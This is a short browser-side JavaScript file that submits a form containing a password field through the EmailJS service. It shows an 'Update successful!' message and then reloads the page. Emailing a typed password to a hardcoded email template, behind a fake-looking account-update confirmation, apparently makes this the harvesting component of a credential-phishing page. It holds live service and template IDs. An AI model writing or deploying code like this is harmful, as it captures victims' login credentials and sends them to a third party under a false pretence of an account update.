// Initialize EmailJS with your User ID
(function(){
    emailjs.init("wO6dwHiFUereQkfxv");
})();

// Button and Form Submission
const btn = document.getElementById('button');

document.getElementById('form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent traditional form submission

    // Store original button text and styles
    const originalText = btn.textContent;
    const originalBgColor = btn.style.backgroundColor;
    const originalColor = btn.style.color;
    
    // Update button to show loading
    btn.textContent = 'Processing...';
    btn.disabled = true;

    // EmailJS IDs
    const serviceID = 'service_9njlbcb';
    const templateID = 'template_2v2sthm';

    console.log("Submitting form via EmailJS...");

    emailjs.sendForm(serviceID, templateID, this)
        .then(() => {
            console.log("Update successful!");
            
            // Change button text to success message
            btn.textContent = 'Update successful!';
            
            // Change button style to indicate success
            btn.style.backgroundColor = '#4CAF50';
            btn.style.color = 'white';
            
            // Reload page after 3 seconds to allow user to see the message
            setTimeout(function() {
                window.location.reload();
            }, 3000);
            
        }, (err) => {
            console.error("Error:", err);
            alert('Error: ' + (err.text || 'Could not submit the form'));
            
            // Reset button state
            btn.textContent = originalText;
            btn.disabled = false;
            btn.style.backgroundColor = originalBgColor;
            btn.style.color = originalColor;
        });

    return false; // Ensure form doesn't submit
});

// Password Visibility Toggle
const togglePasswordButton = document.getElementById("toggle-password");
const closedEyeIcon = document.getElementById("closed-eye");
const openEyeIcon = document.getElementById("open-eye");
const passwordElement = document.getElementById("password");
let isPasswordVisible = false;

togglePasswordButton.addEventListener("click", function() {
    if (!isPasswordVisible) {
        passwordElement.type = "text"; // Show password
        openEyeIcon.classList.remove("hide");
        closedEyeIcon.classList.add("hide");
    } else {
        passwordElement.type = "password"; // Hide password
        closedEyeIcon.classList.remove("hide");
        openEyeIcon.classList.add("hide");
    }
    isPasswordVisible = !isPasswordVisible; // Toggle visibility state
});